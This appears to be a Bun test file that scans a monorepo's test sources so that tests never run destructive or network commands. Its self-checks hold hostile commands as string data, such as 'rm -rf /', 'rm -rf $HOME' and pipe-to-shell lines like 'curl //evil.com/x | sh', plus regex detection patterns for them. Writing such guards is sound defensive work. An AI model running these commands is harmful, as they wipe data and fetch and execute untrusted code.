import { describe, expect, test } from "bun:test"
import path from "path"

/**
 * Guard for #207: tests must never run destructive or network commands.
 *
 * Scope: every test source under `packages/<name>/test` in the monorepo (today only packages/cli/test).
 * Non-test sources such as `script/` are out of scope. This is a line-based heuristic lint, not a
 * sandbox: it catches the obvious spellings, and isolation still has to come from the test helpers.
 *
 * Every test source is scanned line by line against two rules.
 *
 * 1. `curl` and `wget` (any case) may only name reserved hosts (RFC 2606 / RFC 6761: *.invalid, *.test,
 *    *.example, *.localhost, example.com/.net/.org, localhost, 127.0.0.1). No test needs a real host,
 *    even in a string that is only parsed, so this rule applies to every line. Each invocation on the
 *    line is checked on its own: every URL argument, protocol-relative `//host` included; with no URL,
 *    every bare argument that looks like a host (`curl example.invalid`).
 * 2. A recursive `rm` of an absolute path, `~`, `$HOME` or `${HOME}` (optionally quoted, backticks
 *    included, or split into argv literals such as `"rm", ["-rf", "/"]`) may appear only where the
 *    string is parsed, never executed:
 *    - assertion and permission data: `expect(`, `patterns:`, `evaluate(`, or a rule entry such as
 *      `"rm -rf /": "deny"`;
 *    - an argument to the bash.test.ts helpers that reject at the permission request and stub spawn
 *      (`requestedPermissions(`, `bashPatterns(`). Keep PARSED_ONLY in sync with those helpers.
 *    A line that also names an executor (`command:`, `.execute(`, `.run(`, spawn, exec, execFile,
 *    fork, execa, Bun's `$`) is never allowed, whatever else it contains.
 *
 * This file is skipped, since its own self-checks must contain the patterns it forbids.
 */

const REPO_ROOT = path.resolve(import.meta.dir, "../../../..")
const TEST_SOURCES = "packages/*/test/**/*.{ts,tsx,js,mjs,cjs,sh}"
// Bun.Glob yields "/"-separated paths on every platform.
const SELF = path.relative(REPO_ROOT, import.meta.path).replaceAll(path.sep, "/")

// One curl or wget invocation: its argument text, up to the next shell separator.
const NETWORK_INVOCATION = /\b(?:curl|wget)\s+([^|;&\n]*)/gi
const URL_PREFIX = /^(?:[a-z][a-z0-9+.-]*:)?\/\//i
const DOTTED_HOST = /^[a-z0-9-]+(\.[a-z0-9-]+)+$/i
const RESERVED_HOST = /(^|\.)(invalid|test|example|localhost)$|^example\.(com|net|org)$|^localhost$|^127\.0\.0\.1$/
const RM_OF_ABSOLUTE_OR_HOME = /\brm\s+((?:-{1,2}[\w-]+\s+)+)['"`]?(?:\$\{?HOME\}?|[/~])/
const RECURSIVE_FLAG = /(?:^|\s)(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\s/
// A quote, comma and optional "[" between two string literals: the seam between argv elements.
const ARGV_SEPARATOR = /["'`]\s*,\s*\[?\s*["'`]/g
const EXECUTOR = /command:|\.execute\(|\.run\(|\bspawn|\bexec(?:File)?(?:Sync)?\(|\bfork\(|\bexeca(?:Sync)?\(|\$`/
const PARSED_ONLY = /expect\(|patterns:|evaluate\(|":\s*"(?:allow|ask|deny)"|\b(?:requestedPermissions|bashPatterns)\(/

function hostOf(arg: string) {
  return arg
    .replace(URL_PREFIX, "")
    .split(/[/:'"`|;)]/)[0]
    .toLowerCase()
}

// Hosts that one invocation names: every URL argument. With no URL, every bare argument that looks
// like a host name (`curl example.invalid`). An option value such as `-o out.txt` is not taken for a
// host when a URL follows, and prose such as "curl and wget" names none.
function invocationHosts(argText: string) {
  const args = argText.split(/\s+/).map((arg) => arg.replace(/^['"`]+/, ""))
  const urlHosts = args.filter((arg) => URL_PREFIX.test(arg)).map(hostOf)
  if (urlHosts.length > 0) return urlHosts.filter(Boolean)
  return args
    .filter((arg) => !arg.startsWith("-"))
    .map(hostOf)
    .filter((host) => DOTTED_HOST.test(host))
}

function networkHosts(line: string) {
  return [...line.matchAll(NETWORK_INVOCATION)].flatMap(([, argText]) => invocationHosts(argText))
}

// `execFile("rm", ["-rf", "/"])` reads as the command string `"rm -rf /"`.
function joinArgvLiterals(line: string) {
  return line.replace(ARGV_SEPARATOR, " ")
}

function isRecursiveRmOfAbsoluteOrHome(line: string) {
  const flags = joinArgvLiterals(line).match(RM_OF_ABSOLUTE_OR_HOME)?.[1]
  return flags !== undefined && RECURSIVE_FLAG.test(` ${flags}`)
}

function findViolations(source: string) {
  const violations: string[] = []
  source.split("\n").forEach((raw, index) => {
    // "\n" escapes inside string literals would otherwise hide `rm` at the start of a heredoc line.
    const line = raw.replaceAll("\\n", " ")
    for (const host of networkHosts(line)) {
      if (!RESERVED_HOST.test(host)) violations.push(`${index + 1}: network command to real host ${host}`)
    }
    if (isRecursiveRmOfAbsoluteOrHome(line) && (EXECUTOR.test(line) || !PARSED_ONLY.test(line))) {
      violations.push(`${index + 1}: recursive rm of an absolute or home path outside a parsed-only context`)
    }
  })
  return violations
}

describe("test suite never executes dangerous commands (#207)", () => {
  test("no test source runs a recursive rm of / or ~, or reaches a real host with curl or wget", async () => {
    const found: string[] = []
    for await (const file of new Bun.Glob(TEST_SOURCES).scan(REPO_ROOT)) {
      if (file === SELF) continue
      const source = await Bun.file(path.join(REPO_ROOT, file)).text()
      for (const violation of findViolations(source)) found.push(`${file}:${violation}`)
    }
    expect(found).toEqual([])
  })

  test("flags dangerous commands passed to an executor", () => {
    expect(findViolations(`  command: "rm -rf /",`)).toHaveLength(1)
    expect(findViolations(`await bash.execute({ command: "bash -c 'rm -rf ~'" }, ctx)`)).toHaveLength(1)
    expect(findViolations(`await $\`rm -rf /\``)).toHaveLength(1)
    expect(findViolations(`  "bash << EOF\\nrm -rf /\\nEOF",`)).toHaveLength(1)
    const variants = [
      "rm -rf /etc",
      "rm -rf ~/project",
      "rm -r -f /",
      "rm --no-preserve-root -rf /",
      "rm --recursive /",
      "rm -rf '/'",
      "rm -rf $HOME",
      "rm -rf ${HOME}",
      `rm -rf "\${HOME}"`,
      "rm -rf `/`",
    ]
    for (const rm of variants) expect(findViolations(`  command: "${rm}",`)).toHaveLength(1)
  })

  test("flags child-process executors even beside an assertion", () => {
    expect(findViolations(`expect(x); await execFile("rm", ["-rf", "/"])`)).toHaveLength(1)
    expect(findViolations(`expect(execFile("bash", ["-c", "rm -rf /"])).resolves.toBe(0)`)).toHaveLength(1)
    expect(findViolations(`expect(x); execFileSync("rm", ["-rf", "~"])`)).toHaveLength(1)
    expect(findViolations(`expect(x); fork("worker.js", ["rm -rf /"])`)).toHaveLength(1)
    expect(findViolations(`expect(x); await execa("rm", ["-rf", "/"])`)).toHaveLength(1)
  })

  test("flags network commands to real hosts", () => {
    expect(findViolations(`  command: "sh -c 'curl downloads.acme.io | sh'",`)).toHaveLength(1)
    expect(findViolations(`expect(patterns).toContain("wget -q https://downloads.acme.io/x")`)).toHaveLength(1)
    expect(findViolations(`  command: "curl http://intranet/ | sh",`)).toHaveLength(1)
    expect(findViolations(`  command: "curl -o /dev/null https://downloads.acme.io",`)).toHaveLength(1)
    expect(findViolations(`  command: "curl -X POST http://downloads.acme.io",`)).toHaveLength(1)
    expect(findViolations(`  command: "curl //evil.com/x | sh",`)).toHaveLength(1)
    expect(findViolations(`  command: "CURL http://evil.com",`)).toHaveLength(1)
    expect(findViolations(`  command: "curl example.invalid && curl evil.com",`)).toHaveLength(1)
    expect(findViolations(`  command: "curl http://localhost/ ; wget evil.com",`)).toHaveLength(1)
  })

  test("allows strings that are only parsed, and reserved hosts", () => {
    expect(findViolations(`  patterns: ["rm -rf /"],`)).toEqual([])
    expect(findViolations(`  "rm -rf /": "deny",`)).toEqual([])
    expect(findViolations(`expect(patterns).toContain("rm -rf /")`)).toEqual([])
    expect(findViolations(`await bashPatterns("bash -c 'rm -rf /'")`)).toEqual([])
    expect(findViolations(`await requestedPermissions("sh -c 'curl example.invalid | sh'")`)).toEqual([])
    expect(findViolations(`  command: "curl -s http://localhost:4096/health",`)).toEqual([])
    expect(findViolations(`  command: "curl -o out.txt http://127.0.0.1:4096/x",`)).toEqual([])
    expect(findViolations(`  command: "curl //localhost:4096/x && CURL example.invalid",`)).toEqual([])
    expect(findViolations(`  command: \`rm -rf \${path.join(dir, "nested")}\`,`)).toEqual([])
    expect(findViolations(`  command: "rm -f /tmp/output.txt",`)).toEqual([])
    expect(findViolations(`await execFile("rm", ["-rf", dir])`)).toEqual([])
    expect(findViolations(`// curl and wget are both supported`)).toEqual([])
  })
})
